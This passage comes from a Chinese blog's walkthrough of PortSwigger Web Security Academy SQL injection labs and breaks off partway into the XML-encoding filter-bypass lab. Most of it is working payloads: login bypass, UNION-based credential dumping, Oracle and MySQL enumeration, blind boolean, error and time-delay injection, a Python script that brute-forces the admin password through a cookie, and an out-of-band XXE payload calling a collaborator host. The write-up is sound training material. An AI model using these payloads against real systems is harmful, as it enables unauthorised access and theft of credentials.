id="2-允许绕过登录的-SQL-注入漏洞"><a href="#2-允许绕过登录的-SQL-注入漏洞" class="headerlink" title="2.允许绕过登录的 SQL 注入漏洞"></a>2.允许绕过登录的 SQL 注入漏洞</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162247429.png"></p><p>使用他提供的用户名进行登录</p><p>使用用户名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">administrator</span>’+or+&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>或者使用万能密码</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;+or+</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-确定查询返回的列数"><a href="#3-确定查询返回的列数" class="headerlink" title="3.确定查询返回的列数"></a>3.确定查询返回的列数</h3><p>这一关需要我们判断列数，联合查询判断列数的方法常用两种</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+  </span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>这里列数为三因此输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; order by 3 --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-comment">--+ //这里只是判断列数但是吗，没有地方回显因此填null如果填数值会一直错</span><br></code></pre></td></tr></table></figure><p>完成</p><hr><h3 id="4-查找包含文本的列"><a href="#4-查找包含文本的列" class="headerlink" title="4.查找包含文本的列"></a>4.查找包含文本的列</h3><p>前面知道了有三列</p><p>现在这关是让我们测试他的回显，三列在回显的地方填数据，不回显填null</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-symbol">&#x27;abcdef</span>&#x27;,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- </span><br>&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">null</span>,<span class="hljs-symbol">&#x27;abcdef</span>&#x27;,<span class="hljs-keyword">NULL</span><span class="hljs-comment">--</span><br>&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">null</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-symbol">&#x27;abcdef</span>&#x27;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211171153773.png"></p><p>当不报错时就是完成了实验</p><hr><h3 id="5-从其他表中检索数据"><a href="#5-从其他表中检索数据" class="headerlink" title="5.从其他表中检索数据"></a>5.从其他表中检索数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="hljs-string">&#x27;,&#x27;</span>def<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182046102.png"></p><p>发现列数为二而且两列都有返</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182048533.png"></p><p>根据题目提示可以直接查询user表的内容 payload为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+username,+password+FROM+users--</span><br></code></pre></td></tr></table></figure><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182049642.png" style="zoom:80%;" /><p>查询出所有账号和密码登录完成实验</p><hr><h3 id="6-在单个列中检索多个值"><a href="#6-在单个列中检索多个值" class="headerlink" title="6.在单个列中检索多个值"></a>6.在单个列中检索多个值</h3><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182054628.png" style="zoom:67%;" /><p>这关虽然有两列但是只有一个回显</p><p>使用payload可以在一个回显查询两个列值，用~隔开</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+NULL,username||&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;||password+FROM+users--</span><br></code></pre></td></tr></table></figure><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182056881.png" style="zoom:67%;" /><hr><h3 id="7-查询Oracle上的数据库类型和版本"><a href="#7-查询Oracle上的数据库类型和版本" class="headerlink" title="7.查询Oracle上的数据库类型和版本"></a>7.查询Oracle上的数据库类型和版本</h3><p>这题是针对Oracle的注入</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182100113.png"></p><p>针对不同的数据库进行注入语法会不同</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182103872.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="hljs-string">&#x27;,&#x27;</span>def<span class="hljs-string">&#x27;+FROM+dual--</span><br><span class="hljs-string"></span><br><span class="hljs-string">//虽然这个payload是用来判断列数和找回显，但是由于Oracle 数据库的语法要求必须跟着一个表</span><br></code></pre></td></tr></table></figure><p>成功找到回显</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182105280.png"></p><p><strong>v$version视图</strong></p><p>通过确认v$version视图的banner信息可以确认oracle各组件的版本信息</p><p>所以构造payload查询数据库信息</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+banner,<span class="hljs-symbol">&#x27;def</span>&#x27;+FROM+v$version<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>查询成功</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182108894.png" style="zoom:80%;" /><hr><h3 id="8-在MySQL和Microsoft上查询数据库类型和版本"><a href="#8-在MySQL和Microsoft上查询数据库类型和版本" class="headerlink" title="8.在MySQL和Microsoft上查询数据库类型和版本"></a>8.在MySQL和Microsoft上查询数据库类型和版本</h3><p>这一关还是不同数据库的注入熟悉</p><p>先确定列数和找出回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182115577.png"></p><p>再查询数据库版本</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+<span class="hljs-comment">@@</span>version,&#x27;<span class="hljs-number">123</span>&#x27;--+<br></code></pre></td></tr></table></figure><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182117739.png"  style="zoom:80%;" /><hr><h3 id="9-列出非Oracle数据库上的数据库内容"><a href="#9-列出非Oracle数据库上的数据库内容" class="headerlink" title="9.列出非Oracle数据库上的数据库内容"></a>9.列出非Oracle数据库上的数据库内容</h3><p>找出回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;  union select &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192206161.png"></p><p>database()执行失败了那直接先列出所有表名再挑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;  union select database(),&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>列出所有表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">‘ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192212748.png" style="zoom:80%;" /><p>搜索users找到</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192215011.png"></p><p>payload看下列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;union select &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,column_name from information_schema.columns where table_name=&#x27;</span>users_nbosed<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>找到user password 字样的列名 那估计是这个表了</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192216345.png"></p><p>接下来查看数据</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> username_aaivbq,password_tlepbn from  users_nbosed <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>成功拿到账号密码</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192218887.png"></p><hr><h3 id="10-列出Oracle上的数据库内容"><a href="#10-列出Oracle上的数据库内容" class="headerlink" title="10.列出Oracle上的数据库内容"></a>10.列出Oracle上的数据库内容</h3><p>这题是针对Oracle的注入</p><p>先找列数和回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27; from dual --+</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192222859.png"></p><p>先查询所有表</p><p>Oracle的语法和mysql不一样，百度</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192224461.png"></p><p>payload</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27; union <span class="hljs-keyword">select</span> table_name,<span class="hljs-string">&#x27;2&#x27;</span> from all_tables <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192225957.png" style="zoom:80%;" /><p>发现表<strong>USERS_PQNBDC</strong></p><p>先找列名，所有表是all_tables。盲猜所有列是all_columns</p><p>payload</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; union <span class="hljs-keyword">select</span> column_name,<span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">from</span> all_columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;USERS_PQNBDC&#x27;</span>--+<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192228172.png"></p><p>尴尬，还是百度一下</p><p>所有列是all_tab_columns</p><p>那payload为</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; union <span class="hljs-keyword">select</span> column_name,<span class="hljs-string">&#x27;2&#x27;</span> <span class="hljs-keyword">from</span> all_tab_columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;USERS_PQNBDC&#x27;</span>--+<br></code></pre></td></tr></table></figure><p>得到列名</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192229769.png"></p><p>接下来查询数据即可</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> USERNAME_YCTHNA,PASSWORD_GLDACZ <span class="hljs-keyword">from</span> USERS_PQNBDC --+<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192231903.png"></p><h3 id="11-使用条件响应的盲SQL注入"><a href="#11-使用条件响应的盲SQL注入" class="headerlink" title="11.使用条件响应的盲SQL注入"></a>11.使用条件响应的盲SQL注入</h3><p>这关是布尔盲注 注入点在cookie</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192236461.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192236626.png"></p><p>提示已经给了表名和列名</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192239737.png"></p><p>先确定密码长度，payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrackingId=IPgS7VBmdSpwYAOd<span class="hljs-string">&#x27; AND (SELECT &#x27;</span>a<span class="hljs-string">&#x27; FROM users WHERE username=&#x27;</span>administrato<span class="hljs-string">r&#x27; AND LENGTH(password)&gt;1)=&#x27;</span>a<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211192254360.png"></p><p>确定了长度为20</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; AND (SELECT substring(password,1,1) FROM users WHERE username=&#x27;</span>administrator<span class="hljs-string">&#x27;)=&#x27;</span>a<br></code></pre></td></tr></table></figure><p>用burp爆破密码设置两个变量 爆破模式为集束炸弹</p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211200000551.png"></p><p>可以用脚本整理爆破结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a=&#123;<span class="hljs-number">11</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">17</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">14</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-number">15</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">16</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-number">7</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-number">19</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-number">8</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-number">20</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-number">5</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-number">10</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-number">1</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-number">12</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-number">18</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-number">6</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-number">9</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">2</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-number">4</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-number">3</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-number">13</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(a):<br>    <span class="hljs-built_in">print</span>( a[key],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>不过都使用到脚本了那直接写脚本一键爆破</p><p>把url Host Referer cookie里的session TrackingId替换即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&#x27;https://0a6900130436934cc083661000a70023.web-security-academy.net/&#x27;</span><br>h=&#123;<br><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;0a6900130436934cc083661000a70023.web-security-academy.net&quot;</span>,<br><span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;https://0a6900130436934cc083661000a70023.web-security-academy.net/product?productId=5&quot;</span>,<br><span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br><span class="hljs-string">&quot;cookie&quot;</span>:<span class="hljs-string">&quot;session=M6dkDdqgjVHZ68qqURJLVyHKDudPXdYq;TrackingId=mh8iapx7aLiba5B7&#x27;+AND+(SELECT+substring(password,%d,1)+FROM+users+WHERE+username=&#x27;administrator&#x27;)=&#x27;%s&quot;</span>,<br><span class="hljs-string">&quot;Sec-Fetch-Dest&quot;</span>:<span class="hljs-string">&quot;document&quot;</span>,<br><span class="hljs-string">&quot;Sec-Fetch-Mode&quot;</span>:<span class="hljs-string">&quot;navigate&quot;</span>,<br><span class="hljs-string">&quot;Sec-Fetch-Site&quot;</span>:<span class="hljs-string">&quot;same-origin&quot;</span>,<br><span class="hljs-string">&quot;Sec-Fetch-User&quot;</span>:<span class="hljs-string">&quot;?1&quot;</span><br>&#125;<br>b=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>):<br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> b:<br>        h[<span class="hljs-string">&quot;Cookie&quot;</span>] %(i,n)<br>        res=requests.get(url,headers=h)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            <span class="hljs-built_in">print</span>(n,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211202315858.png"></p><hr><h3 id="12-具有条件错误的盲SQL注入"><a href="#12-具有条件错误的盲SQL注入" class="headerlink" title="12.具有条件错误的盲SQL注入"></a>12.具有条件错误的盲SQL注入</h3><p>参考<a href="https://www.shuzhiduo.com/A/MyJx2r1adn/">https://www.shuzhiduo.com/A/MyJx2r1adn/</a></p><p>这关和上一关差不多，只是上一关用Welcome来判断这一关用是否报错判断</p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211202334756.png" style="zoom:80%;" /><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211202335430.png" style="zoom:80%;" /><p>用order by 判断列数</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span> --+ //页面正常<br>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span> --+ //页面报错<br></code></pre></td></tr></table></figure><p>因此列数为1</p><p>这题的网站使用的是Oracle 数据库，判断方法为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">#查询一条空数据，由于Oracle 数据库每一条查询都需要带表名，所以会查询失败<br>TrackingId<span class="hljs-operator">=</span>xyz<span class="hljs-string">&#x27;||(SELECT &#x27;&#x27;)||&#x27;</span><br><br>#把表名带上查询空数据，如果查询成功说名目标使用Oracle 数据库<br><span class="hljs-string">&#x27;||(SELECT &#x27;&#x27; FROM dual)||&#x27;</span><br></code></pre></td></tr></table></figure><p>然后测试密码长度</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||(SELECT CASE WHEN LENGTH(password)&gt;3 THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="hljs-string">&#x27;)||&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211211027138.png"></p><p>这个payload当语句执行结果正确时网页返回的是报错，所以这里可以得到密码长度为20</p><p>题目已经告诉了表名 列名 和用户名 可以直接查询密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;||(SELECT CASE WHEN SUBSTR(password,2,1)=&#x27;</span>a<span class="hljs-string">&#x27; THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="hljs-string">&#x27;)||&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211211100403.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211211101331.png"></p><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211211101757.png"></p><hr><h3 id="13-具有时间延迟的盲SQL注入"><a href="#13-具有时间延迟的盲SQL注入" class="headerlink" title="13.具有时间延迟的盲SQL注入"></a>13.具有时间延迟的盲SQL注入</h3><p>这关是延时注入，注入点在cookie</p><p>payload判断是否存在</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">&#x27; |<span class="hljs-type">| pg_sleep</span>(<span class="hljs-number">10</span>)-<br></code></pre></td></tr></table></figure><h3 id="14-具有时间延迟和信息检索的盲SQL注入"><a href="#14-具有时间延迟和信息检索的盲SQL注入" class="headerlink" title="14.具有时间延迟和信息检索的盲SQL注入"></a>14.具有时间延迟和信息检索的盲SQL注入</h3><p>在上一题的基础上注出密码，根据给出的payload 注出用户名 密码长度 密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">trackingid=x<span class="hljs-string">&#x27;%3bselect+case+when+(username=&#x27;</span>administrator<span class="hljs-string">&#x27;)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users-- 用户名</span><br><span class="hljs-string"></span><br><span class="hljs-string">trackingid=x&#x27;</span>%<span class="hljs-number">3</span>bselect+<span class="hljs-keyword">case</span>+<span class="hljs-keyword">when</span>+(username=<span class="hljs-string">&#x27;administrator&#x27;</span>+<span class="hljs-keyword">and</span>+length(<span class="hljs-keyword">password</span>)&gt;<span class="hljs-number">2</span>)+<span class="hljs-keyword">then</span>+pg_sleep(<span class="hljs-number">10</span>)+<span class="hljs-keyword">else</span>+pg_sleep(<span class="hljs-number">0</span>)+<span class="hljs-keyword">end</span>+<span class="hljs-keyword">from</span>+users<span class="hljs-comment">-- 密码长度</span><br><br>trackingid=x<span class="hljs-string">&#x27;%3bselect+case+when+(username=&#x27;</span>administrator<span class="hljs-string">&#x27;+and+substring(password,2,1)=&#x27;</span>§a§<span class="hljs-string">&#x27;)+then+pg_sleep(10)+else+pg_sleep(0)+end+from+users-- 密码</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303081611425.png"></p><h3 id="15-带外交互的盲-SQL-注入"><a href="#15-带外交互的盲-SQL-注入" class="headerlink" title="15.带外交互的盲 SQL 注入"></a>15.带外交互的盲 SQL 注入</h3><ol><li>访问商店的首页，并使用Burp Suite拦截和修改包含cookie的请求。<code>TrackingId</code></li><li>修改 Cookie，将其更改为将触发与协作者服务器交互的有效负载。例如，您可以将 SQL 注入与基本的 <a href="https://portswigger.net/web-security/xxe">XXE</a> 技术相结合</li></ol><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;<span class="hljs-meta">&lt;!DOCTYPE+root+[+<span class="hljs-meta">&lt;!ENTITY+%25+remote+SYSTEM+<span class="hljs-string">&quot;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&quot;</span>&gt;</span>+%25remote%3b]&gt;</span>&#x27;),&#x27;/l&#x27;)+FROM+dual--<br><br></code></pre></td></tr></table></figure><p>使用 burp collaborator client</p><p>替换之后的payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">TrackingId=x<span class="hljs-string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span>&lt;%<span class="hljs-number">3</span>fxml+version%<span class="hljs-number">3</span>d<span class="hljs-string">&quot;1.0&quot;</span>+encoding%<span class="hljs-number">3</span>d<span class="hljs-string">&quot;UTF-8&quot;</span>%<span class="hljs-number">3</span>f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%<span class="hljs-number">25</span>+remote+SYSTEM+<span class="hljs-string">&quot;http%3a//7y6mp6oqqpi26r9lyv2b8qogn7tyhn.burpcollaborator.net/&quot;</span>&gt;+%<span class="hljs-number">25</span>remote%<span class="hljs-number">3</span>b]&gt;<span class="hljs-string">&#x27;),&#x27;</span>/l<span class="hljs-string">&#x27;)+FROM+dual--</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303081625120.png"></p><p>实验即可完成</p><h3 id="16-带外数据泄露的盲-SQL-注入"><a href="#16-带外数据泄露的盲-SQL-注入" class="headerlink" title="16.带外数据泄露的盲 SQL 注入"></a>16.带外数据泄露的盲 SQL 注入</h3><p>在上一题的基础上进行交互</p><p>点击poll now进行交互 登陆得到的admin账号密码即可通关</p><h3 id="17-通过-XML-编码使用过滤器旁路的-SQL-注入"><a href="#17-通过-XML-编码使用过滤器旁路的-SQL-注入" class="headerlink" title="17.通过 XML 编码使用过滤器旁路的 SQL 注入"></a>17.通过 XML 编码使用过滤器旁路的 SQL 注入</h3><p>点击进入商品页面</p><p>点击<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303091459528.png"></p><p>抓包，发现有xml代码，而且可以用表达式控制 1+1 和 2 的返回结果是一样的因此可能存在注入</p><p><img 